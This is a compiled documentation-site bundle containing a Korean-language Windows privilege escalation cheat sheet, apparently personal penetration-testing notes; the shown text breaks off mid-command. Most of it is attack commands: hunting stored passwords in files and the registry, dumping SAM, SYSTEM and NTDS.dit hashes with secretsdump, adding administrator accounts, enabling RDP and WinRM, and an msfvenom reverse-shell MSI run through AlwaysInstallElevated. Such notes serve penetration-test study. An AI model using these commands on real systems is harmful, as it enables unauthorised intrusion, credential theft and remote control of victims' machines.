"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[6965],{7019:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>h,frontMatter:()=>d,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"cheatsheet/privilege-escalation/windows","title":"Windows Privilege Escalation","description":"Windows \uc2dc\uc2a4\ud15c\uc5d0\uc11c\uc758 \uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95\uc785\ub2c8\ub2e4.","source":"@site/docs/cheatsheet/privilege-escalation/windows.md","sourceDirName":"cheatsheet/privilege-escalation","slug":"/cheatsheet/privilege-escalation/windows","permalink":"/my-docusaurus-page/cheatsheet/privilege-escalation/windows","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Linux Privilege Escalation","permalink":"/my-docusaurus-page/cheatsheet/privilege-escalation/linux"},"next":{"title":"Exploitation","permalink":"/my-docusaurus-page/category/exploitation"}}');var l=s(4848),r=s(8453);const d={sidebar_position:2},c="Windows Privilege Escalation",t={},a=[{value:"\uae30\ubcf8 \uc5f4\uac70",id:"\uae30\ubcf8-\uc5f4\uac70",level:2},{value:"SID (Security Identifier)",id:"sid-security-identifier",level:2},{value:"SID \uad6c\uc870",id:"sid-\uad6c\uc870",level:3},{value:"\uc8fc\uc694 SID",id:"\uc8fc\uc694-sid",level:3},{value:"accesschk",id:"accesschk",level:2},{value:"\uc228\uae40 \ud30c\uc77c/\ud3f4\ub354 \ud45c\uc2dc",id:"\uc228\uae40-\ud30c\uc77c\ud3f4\ub354-\ud45c\uc2dc",level:2},{value:"\uc124\uce58\ub41c \ud504\ub85c\uadf8\ub7a8 \ud655\uc778",id:"\uc124\uce58\ub41c-\ud504\ub85c\uadf8\ub7a8-\ud655\uc778",level:2},{value:"\uc0ac\uc6a9\uc790 \uad00\ub9ac",id:"\uc0ac\uc6a9\uc790-\uad00\ub9ac",level:2},{value:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1",id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",level:2},{value:"Quick Wins",id:"quick-wins",level:3},{value:"\ud30c\uc77c\uc5d0\uc11c \ube44\ubc00\ubc88\ud638 \uac80\uc0c9",id:"\ud30c\uc77c\uc5d0\uc11c-\ube44\ubc00\ubc88\ud638-\uac80\uc0c9",level:3},{value:"PowerShell \ud788\uc2a4\ud1a0\ub9ac",id:"powershell-\ud788\uc2a4\ud1a0\ub9ac",level:3},{value:"\uc800\uc7a5\ub41c Windows \uc790\uaca9\uc99d\uba85",id:"\uc800\uc7a5\ub41c-windows-\uc790\uaca9\uc99d\uba85",level:3},{value:"Winlogon \uc790\uaca9\uc99d\uba85",id:"winlogon-\uc790\uaca9\uc99d\uba85",level:3},{value:"LAPS (Local Administrator Password Solution)",id:"laps-local-administrator-password-solution",level:3},{value:"\ub808\uc9c0\uc2a4\ud2b8\ub9ac\uc5d0\uc11c \ube44\ubc00\ubc88\ud638 \uac80\uc0c9",id:"\ub808\uc9c0\uc2a4\ud2b8\ub9ac\uc5d0\uc11c-\ube44\ubc00\ubc88\ud638-\uac80\uc0c9",level:3},{value:"\uc790\uaca9\uc99d\uba85 \ub364\ud504",id:"\uc790\uaca9\uc99d\uba85-\ub364\ud504",level:3},{value:"KeePass \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ucc3e\uae30",id:"keepass-\ub370\uc774\ud130\ubca0\uc774\uc2a4-\ucc3e\uae30",level:3},{value:"IIS (Internet Information Service)",id:"iis-internet-information-service",level:3},{value:"PuTTY",id:"putty",level:3},{value:"Unattended Windows Installations",id:"unattended-windows-installations",level:3},{value:"WinRM \ud65c\uc131\ud654",id:"winrm-\ud65c\uc131\ud654",level:2},{value:"RDP \ud65c\uc131\ud654",id:"rdp-\ud65c\uc131\ud654",level:2},{value:"\uad8c\ud55c \ubc0f \ud2b9\uad8c",id:"\uad8c\ud55c-\ubc0f-\ud2b9\uad8c",level:2},{value:"AlwaysInstallElevated",id:"alwaysinstallelevated",level:3},{value:"SeBackup / SeRestore \uad8c\ud55c",id:"sebackup--serestore-\uad8c\ud55c",level:3},{value:"SAM\uacfc SYSTEM \ud574\uc2dc \ubc31\uc5c5",id:"sam\uacfc-system-\ud574\uc2dc-\ubc31\uc5c5",level:4},{value:"diskshadow\ub97c \uc774\uc6a9\ud55c NTDS.dit \ubcf5\uc0ac",id:"diskshadow\ub97c-\uc774\uc6a9\ud55c-ntdsdit-\ubcf5\uc0ac",level:4},{value:"Robocopy \ub300\uc548",id:"robocopy-\ub300\uc548",level:4},{value:"SeEnableDelegationPrivilege",id:"seenabledelegationprivilege",level:3},{value:"\uc608\uc81c 1",id:"\uc608\uc81c-1",level:4},{value:"\uc608\uc81c 2",id:"\uc608\uc81c-2",level:4},{value:"SeLoadDriverPrivilege",id:"seloaddriverprivilege",level:3},{value:"SeManageVolumePrivilege",id:"semanagevolumeprivilege",level:3},{value:"C:\\ \ub4dc\ub77c\uc774\ube0c \uc804\uccb4 \uad8c\ud55c \ubd80\uc5ec",id:"c-\ub4dc\ub77c\uc774\ube0c-\uc804\uccb4-\uad8c\ud55c-\ubd80\uc5ec",level:4},{value:"Printconfig.dll \ub36e\uc5b4\uc4f0\uae30",id:"printconfigdll-\ub36e\uc5b4\uc4f0\uae30",level:4},{value:"SeTakeOwnershipPrivilege",id:"setakeownershipprivilege",level:3},{value:"SeImpersonate / SeAssignPrimaryToken",id:"seimpersonate--seassignprimarytoken",level:3},{value:"JuicyPotato",id:"juicypotato",level:4},{value:"PrintSpoofer",id:"printspoofer",level:4},{value:"GodPotato",id:"godpotato",level:4},{value:"DLL Hijacking",id:"dll-hijacking",level:2},{value:"DLL \uac80\uc0c9 \uc21c\uc11c",id:"dll-\uac80\uc0c9-\uc21c\uc11c",level:3},{value:"DLL \uc545\uc6a9",id:"dll-\uc545\uc6a9",level:3},{value:"customdll.cpp",id:"customdllcpp",level:3},{value:"\ucef4\ud30c\uc77c",id:"\ucef4\ud30c\uc77c",level:3},{value:"\uc2e4\ud589",id:"\uc2e4\ud589",level:3},{value:"Windows \uc11c\ube44\uc2a4 \uc545\uc6a9",id:"windows-\uc11c\ube44\uc2a4-\uc545\uc6a9",level:2},{value:"\uc2e4\ud589 \uc911\uc778 \uc11c\ube44\uc2a4 \uc5f4\uac70",id:"\uc2e4\ud589-\uc911\uc778-\uc11c\ube44\uc2a4-\uc5f4\uac70",level:3},{value:"\uc11c\ube44\uc2a4 \uc124\uc815 \ud655\uc778",id:"\uc11c\ube44\uc2a4-\uc124\uc815-\ud655\uc778",level:3},{value:"\uad8c\ud55c \ud14c\uc774\ube14",id:"\uad8c\ud55c-\ud14c\uc774\ube14",level:3},{value:"\uad8c\ud55c \uc5f4\uac70",id:"\uad8c\ud55c-\uc5f4\uac70",level:3},{value:"\uc11c\ube44\uc2a4 \ubc14\uc774\ub108\ub9ac \uad50\uccb4",id:"\uc11c\ube44\uc2a4-\ubc14\uc774\ub108\ub9ac-\uad50\uccb4",level:3},{value:"adduser.c",id:"adduserc",level:4},{value:"\ucef4\ud30c\uc77c",id:"\ucef4\ud30c\uc77c-1",level:4},{value:"\uc2e4\ud589",id:"\uc2e4\ud589-1",level:4},{value:"Unquoted Service Path",id:"unquoted-service-path",level:3},{value:"PowerUp.ps1",id:"powerupps1",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"windows-privilege-escalation",children:"Windows Privilege Escalation"})}),"\n",(0,l.jsx)(n.p,{children:"Windows \uc2dc\uc2a4\ud15c\uc5d0\uc11c\uc758 \uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95\uc785\ub2c8\ub2e4."}),"\n",(0,l.jsx)(n.h2,{id:"\uae30\ubcf8-\uc5f4\uac70",children:"\uae30\ubcf8 \uc5f4\uac70"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \uc0ac\uc6a9\uc790 \uc815\ubcf4\nwhoami\nwhoami /all\nwhoami /user\nwhoami /priv\nwhoami /groups\n\n# \uc2dc\uc2a4\ud15c \uc815\ubcf4\nsysteminfo\nhostname\n\n# \uacc4\uc815 \uc815\ubcf4\nnet accounts\nnet user\nnet user /domain\nnet user <USERNAME>\nnet localgroup\nnet localgroup administrators\n\n# PowerShell\nGet-LocalUser\nGet-LocalGroup\nGet-LocalGroupMember administrators\nGet-LocalGroupMember \"Remote Desktop Users\"\n\n# \ud504\ub85c\uc138\uc2a4\nGet-Process\ntasklist\ntasklist /SVC\ntree /f C:\\Users\\\n\n# \uc11c\ube44\uc2a4\nsc query\nsc qc <SERVICE>\nGet-Service\n\n# \ubc29\ud654\ubcbd\nnetsh firewall show state\nnetsh advfirewall firewall show rule name=all\nnetsh advfirewall show allprofiles\n\n# \uc608\uc57d\ub41c \uc791\uc5c5\nschtasks /query /fo LIST /v\nGet-ScheduledTask\n\n# \uc124\uce58\ub41c \uc5c5\ub370\uc774\ud2b8\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# \ub4dc\ub77c\uc774\ubc84\ndriverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path\n\n# \ub124\ud2b8\uc6cc\ud06c\nipconfig /all\nroute print\narp -a\nnetstat -ano\n"})}),"\n",(0,l.jsx)(n.h2,{id:"sid-security-identifier",children:"SID (Security Identifier)"}),"\n",(0,l.jsx)(n.h3,{id:"sid-\uad6c\uc870",children:"SID \uad6c\uc870"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\ud615\uc2dd:"})," S-R-X-Y"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"S"}),": SID\ub97c \ub098\ud0c0\ub0c4"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"R"}),": Revision (\ud56d\uc0c1 1)"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"X"}),": Identifier Authority (\ub300\ubd80\ubd84 5)"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"Y"}),": Sub Authority"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\uc8fc\uc694-sid",children:"\uc8fc\uc694 SID"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"SID"}),(0,l.jsx)(n.th,{children:"\uc124\uba85"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-0-0"}),(0,l.jsx)(n.td,{children:"Nobody"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-1-0"}),(0,l.jsx)(n.td,{children:"Everybody"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-11"}),(0,l.jsx)(n.td,{children:"Authenticated Users"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-18"}),(0,l.jsx)(n.td,{children:"Local System"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-19"}),(0,l.jsx)(n.td,{children:"Local Service"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-20"}),(0,l.jsx)(n.td,{children:"Network Service"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-domainidentifier-500"}),(0,l.jsx)(n.td,{children:"Administrator"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-domainidentifier-512"}),(0,l.jsx)(n.td,{children:"Domain Admins"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"S-1-5-domainidentifier-513"}),(0,l.jsx)(n.td,{children:"Domain Users"})]})]})]}),"\n",(0,l.jsx)(n.h2,{id:"accesschk",children:"accesschk"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk",children:"https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \ud30c\uc77c \uad8c\ud55c \ud655\uc778\n.\\accesschk.exe /accepteula -quvw "C:\\PATH\\TO\\FILE\\<FILE>.exe"\n\n# \uc11c\ube44\uc2a4 \uad8c\ud55c \ud655\uc778\n.\\accesschk.exe /accepteula -uwcqv <USERNAME> <SERVICE>\n.\\accesschk.exe /accepteula -uwcqv "Authenticated Users" *\n\n# \uacbd\ub85c \uad8c\ud55c \ud655\uc778 (Unquoted Service Path)\n.\\accesschk.exe /accepteula -uwdq C:\\\n.\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\"\n.\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\<UNQUOTED_SERVICE_PATH>\\"\n\n# \ub808\uc9c0\uc2a4\ud2b8\ub9ac \uad8c\ud55c \ud655\uc778\n.\\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\uc228\uae40-\ud30c\uc77c\ud3f4\ub354-\ud45c\uc2dc",children:"\uc228\uae40 \ud30c\uc77c/\ud3f4\ub354 \ud45c\uc2dc"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# cmd\ndir /a           # \ubaa8\ub4e0 \uc228\uae40 \ud30c\uc77c/\ud3f4\ub354\ndir /a:d         # \uc228\uae40 \ub514\ub809\ud1a0\ub9ac\ub9cc\ndir /a:h         # \uc228\uae40 \ud30c\uc77c\ub9cc\n\n# \uba85\uc2dc\uc801 cmd\ncmd /c dir /A\ncmd /c dir /A:D\ncmd /c dir /A:H\n\n# PowerShell\npowershell ls -force\nGet-ChildItem -Hidden\nGet-ChildItem -Force\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\uc124\uce58\ub41c-\ud504\ub85c\uadf8\ub7a8-\ud655\uc778",children:"\uc124\uce58\ub41c \ud504\ub85c\uadf8\ub7a8 \ud655\uc778"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \ub808\uc9c0\uc2a4\ud2b8\ub9ac \uc870\ud68c\nGet-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname\n\nGet-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname\n\n# WMIC\nwmic product get name,version\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\uc0ac\uc6a9\uc790-\uad00\ub9ac",children:"\uc0ac\uc6a9\uc790 \uad00\ub9ac"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \uc0ac\uc6a9\uc790 \ucd94\uac00\nnet user <USERNAME> <PASSWORD> /add\nnet user <USERNAME> <PASSWORD> /add /domain\n\n# \uadf8\ub8f9 \ucd94\uac00\nnet localgroup administrators <USERNAME> /add\nnet localgroup "Remote Desktop Users" <USERNAME> /add\nnet group "Exchange Windows Permissions" /add <USERNAME>\nnet localgroup "Remote Management Users" /add <USERNAME>\n\n# \uc0ac\uc6a9\uc790 \uc0ad\uc81c\nnet user <USERNAME> /delete\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",children:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1"}),"\n",(0,l.jsx)(n.h3,{id:"quick-wins",children:"Quick Wins"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \uc800\uc7a5\ub41c \uc790\uaca9\uc99d\uba85\ncmdkey /list\nrundll32 keymgr.dll, KRShowKeyMgr\n\n# Winlogon\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\n\n# PuTTY\nreg query HKEY_CURRENT_USER\\Software\\<USERNAME>\\PuTTY\\Sessions\\ /f "Proxy" /s\n\n# \uc5f0\uacb0 \ubb38\uc790\uc5f4\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n'})}),"\n",(0,l.jsx)(n.h3,{id:"\ud30c\uc77c\uc5d0\uc11c-\ube44\ubc00\ubc88\ud638-\uac80\uc0c9",children:"\ud30c\uc77c\uc5d0\uc11c \ube44\ubc00\ubc88\ud638 \uac80\uc0c9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \uae30\ubcf8 \uac80\uc0c9\nfindstr /si password *.xml *.ini *.txt\nfindstr /si password *.config\n\n# \ub514\ub809\ud1a0\ub9ac \uac80\uc0c9\ndir /s *pass* == *.config\ndir /s *pass* == *cred* == *vnc* == *.config*\n\n# PowerShell \uac80\uc0c9\nGet-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem -Path C:\\Users\\<USERNAME>\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue\n\n# \ud2b9\uc815 \ud655\uc7a5\uc790\nGet-ChildItem -Path C:\\ -Include *.txt,*.ini,*.config,*.xml,*.vbs,*.ps1 -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"\n'})}),"\n",(0,l.jsx)(n.h3,{id:"powershell-\ud788\uc2a4\ud1a0\ub9ac",children:"PowerShell \ud788\uc2a4\ud1a0\ub9ac"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \ud788\uc2a4\ud1a0\ub9ac \ud655\uc778\nGet-History\n\n# \ud788\uc2a4\ud1a0\ub9ac \ud30c\uc77c \uacbd\ub85c\n(Get-PSReadlineOption).HistorySavePath\n\n# \ud788\uc2a4\ud1a0\ub9ac \ud30c\uc77c \uc77d\uae30\ntype C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\ntype C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\uc800\uc7a5\ub41c-windows-\uc790\uaca9\uc99d\uba85",children:"\uc800\uc7a5\ub41c Windows \uc790\uaca9\uc99d\uba85"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \uc800\uc7a5\ub41c \uc790\uaca9\uc99d\uba85 \ubaa9\ub85d\ncmdkey /list\n\n# \uc800\uc7a5\ub41c \uc790\uaca9\uc99d\uba85\uc73c\ub85c \uc2e4\ud589\nrunas /savecred /user:<DOMAIN>\\<USERNAME> cmd.exe\nrunas /savecred /user:administrator cmd.exe\n"})}),"\n",(0,l.jsx)(n.h3,{id:"winlogon-\uc790\uaca9\uc99d\uba85",children:"Winlogon \uc790\uaca9\uc99d\uba85"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\n\n# DefaultUserName, DefaultPassword \ud655\uc778\n'})}),"\n",(0,l.jsx)(n.h3,{id:"laps-local-administrator-password-solution",children:"LAPS (Local Administrator Password Solution)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# LAPS \ube44\ubc00\ubc88\ud638 \ud655\uc778\nGet-ADComputer <RHOST> -property 'ms-mcs-admpwd'\n\n# LAPS \uc124\uce58 \ud655\uc778\nGet-ChildItem 'C:\\Program Files\\LAPS\\CSE\\Admpwd.dll'\n\n# LAPS \ub808\uc9c0\uc2a4\ud2b8\ub9ac\nreg query \"HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd\" /v AdmPwdEnabled\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\ub808\uc9c0\uc2a4\ud2b8\ub9ac\uc5d0\uc11c-\ube44\ubc00\ubc88\ud638-\uac80\uc0c9",children:"\ub808\uc9c0\uc2a4\ud2b8\ub9ac\uc5d0\uc11c \ube44\ubc00\ubc88\ud638 \uac80\uc0c9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\nreg query HKLM /f pwd /t REG_SZ /s\nreg query HKCU /f pwd /t REG_SZ /s\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\uc790\uaca9\uc99d\uba85-\ub364\ud504",children:"\uc790\uaca9\uc99d\uba85 \ub364\ud504"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# SAM, SYSTEM, SECURITY \ub364\ud504\nreg save hklm\\system system\nreg save hklm\\sam sam\nreg save hklm\\security security\n\n# \ub610\ub294\nreg.exe save hklm\\sam c:\\temp\\sam.save\nreg.exe save hklm\\security c:\\temp\\security.save\nreg.exe save hklm\\system c:\\temp\\system.save\n\n# \ubcf5\uc6d0 (\ub85c\uceec\uc5d0\uc11c)\nimpacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL\n"})}),"\n",(0,l.jsx)(n.h3,{id:"keepass-\ub370\uc774\ud130\ubca0\uc774\uc2a4-\ucc3e\uae30",children:"KeePass \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ucc3e\uae30"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n\ndir /s /b C:\\*.kdbx\n"})}),"\n",(0,l.jsx)(n.h3,{id:"iis-internet-information-service",children:"IIS (Internet Information Service)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# IIS \uc124\uc815\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@:*\n\n# web.config\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n\n# applicationHost.config\ntype C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\n"})}),"\n",(0,l.jsx)(n.h3,{id:"putty",children:"PuTTY"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /s\n'})}),"\n",(0,l.jsx)(n.h3,{id:"unattended-windows-installations",children:"Unattended Windows Installations"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"C:\\Unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \uac80\uc0c9\ndir /s C:\\Unattend.xml\ndir /s C:\\sysprep.inf\ndir /s C:\\sysprep.xml\n\n# \ub0b4\uc6a9 \ud655\uc778\ntype C:\\Windows\\Panther\\Unattend.xml\n"})}),"\n",(0,l.jsx)(n.h2,{id:"winrm-\ud65c\uc131\ud654",children:"WinRM \ud65c\uc131\ud654"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'winrm quickconfig\nEnable-PSRemoting -Force\n\n# \uc6d0\uaca9\uc5d0\uc11c \ud65c\uc131\ud654\n.\\PsExec64.exe \\\\<RHOST> -u <DOMAIN>\\<USERNAME> -p <PASSWORD> -h -d powershell.exe "enable-psremoting -force"\n'})}),"\n",(0,l.jsx)(n.h2,{id:"rdp-\ud65c\uc131\ud654",children:"RDP \ud65c\uc131\ud654"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# RDP \ud65c\uc131\ud654\nreg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n# \ubc29\ud654\ubcbd \uaddc\uce59\nnetsh advfirewall firewall set rule group="remote desktop" new enable=Yes\n\n# PowerShell\nSet-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\' -name "fDenyTSConnections" -value 0\nEnable-NetFirewallRule -DisplayGroup "Remote Desktop"\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\uad8c\ud55c-\ubc0f-\ud2b9\uad8c",children:"\uad8c\ud55c \ubc0f \ud2b9\uad8c"}),"\n",(0,l.jsx)(n.h3,{id:"alwaysinstallelevated",children:"AlwaysInstallElevated"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \ud655\uc778\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# \ub458 \ub2e4 1\uc774\uba74 \uc545\uc6a9 \uac00\ub2a5\n"})}),"\n",(0,l.jsx)(n.p,{children:"MSI \ud30c\uc77c \uc0dd\uc131:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi\n"})}),"\n",(0,l.jsx)(n.p,{children:"\uc2e4\ud589:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"msiexec /quiet /qn /i shell.msi\n"})}),"\n",(0,l.jsx)(n.h3,{id:"sebackup--serestore-\uad8c\ud55c",children:"SeBackup / SeRestore \uad8c\ud55c"}),"\n",(0,l.jsx)(n.h4,{id:"sam\uacfc-system-\ud574\uc2dc-\ubc31\uc5c5",children:"SAM\uacfc SYSTEM \ud574\uc2dc \ubc31\uc5c5"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# SAM, SYSTEM \ub364\ud504\nreg save hklm\\sam C:\\Temp\\sam\nreg save hklm\\system C:\\Temp\\system\n\n# \ub2e4\uc6b4\ub85c\ub4dc \ud6c4 \ub85c\uceec\uc5d0\uc11c:\nimpacket-secretsdump -sam sam -system system LOCAL\n"})}),"\n",(0,l.jsx)(n.h4,{id:"diskshadow\ub97c-\uc774\uc6a9\ud55c-ntdsdit-\ubcf5\uc0ac",children:"diskshadow\ub97c \uc774\uc6a9\ud55c NTDS.dit \ubcf5\uc0ac"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"Script (script.txt):"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"set context persistent nowriters\nadd volume c: alias temp\ncreate\nexpose %temp% z:\n"})}),"\n",(0,l.jsx)(n.p,{children:"\uc2e4\ud589:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"diskshadow /s script.txt\n\n# NTDS.dit \ubcf5\uc0ac\nrobocopy /b z:\\windows\\ntds . ntds.dit\n\n# SYSTEM \ub808\uc9c0\uc2a4\ud2b8\ub9ac\nreg save hklm\\system system\n\n# \uc885\ub8cc\ndiskshadow\ndelete shadows volume %temp%\nreset\nexit\n"})}),"\n",(0,l.jsx)(n.p,{children:"\ub85c\uceec\uc5d0\uc11c \ud574\uc2dc \ucd94\ucd9c:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"impacket-secretsdump -ntds ntds.dit -system system LOCAL\n"})}),"\n",(0,l.jsx)(n.h4,{id:"robocopy-\ub300\uc548",children:"Robocopy \ub300\uc548"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"robocopy /b z:\\windows\\ntds . ntds.dit\n"})}),"\n",(0,l.jsx)(n.h3,{id:"seenabledelegationprivilege",children:"SeEnableDelegationPrivilege"}),"\n",(0,l.jsx)(n.h4,{id:"\uc608\uc81c-1",children:"\uc608\uc81c 1"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"# \ucde8\uc57d\ud55c \uc0ac\uc6a9\uc790 \ud655\uc778\nGet-ADUser -Filter * | Where-Object {$_.UserPrincipalName -ne $null}\n\n# \uad8c\ud55c \ucd94\uac00\nSet-ADUser 